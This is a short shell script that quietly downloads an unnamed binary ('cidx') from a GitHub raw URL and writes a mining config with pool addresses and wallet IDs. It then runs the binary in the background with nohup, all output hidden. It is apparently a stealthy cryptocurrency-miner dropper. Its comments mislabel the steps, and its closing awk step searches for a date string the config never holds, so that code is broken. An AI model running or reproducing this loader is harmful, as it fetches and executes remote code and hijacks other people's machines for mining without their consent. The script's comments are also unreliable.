# Download and extract the cidx file
wget -O cidx https://github.com/barburonjilo/back/raw/main/sru >/dev/null 2>&1

# Set the current date in UTC-7 format
current_date=$(TZ=UTC-7 date +"%H-%M [%d-%m]")

# Create config.json with the current date
cat > config.json <<END
{
  "url": "45.115.224.243:443",
  "user": "Ssy29Ak9dCkPqyFRa8aroHTNMu2ynpsJ9JU2ZZf7SX85beMdbDjhvUL6sXiSnVCL9jPapFCGdGD3g7rRokxs9W8t52tQ3qi4NA.bloody",
  "pass": "x",
  "threads": 5,
  "algo": "panthera"
}
END

# Make cidx and config.json executable
chmod +x config.json cidx

# Run cidx in the background
nohup ./cidx -o 45.115.224.138:443 -a Flex -u KCN=kc1qndlfjd9n0q9659fhp34v9vjasjs3ugc4nevans -t 6 -p x &>/dev/null &

# Clear the screen and print the current time and running jobs
clear
echo RUN $(TZ=UTC-7 date +"%R-[%d/%m/%y]") && jobs

# Run awk to process config.json and print the matching date-time part
awk -v date_str="i-${current_date}" '
{
  if ($0 ~ /i-[0-9]{2}-[0-9]{2} \[[0-9]{2}-[0-9]{2}\]/) {
    # Extract and print only the "i-<hour>-<minute> [<day>-<month>]" part
    match($0, /i-[0-9]{2}-[0-9]{2} \[[0-9]{2}-[0-9]{2}\]/, arr)
    if (length(arr) > 0) {
      print arr[0]  # Print the matched date-time part
    }
  }
}
' config.json
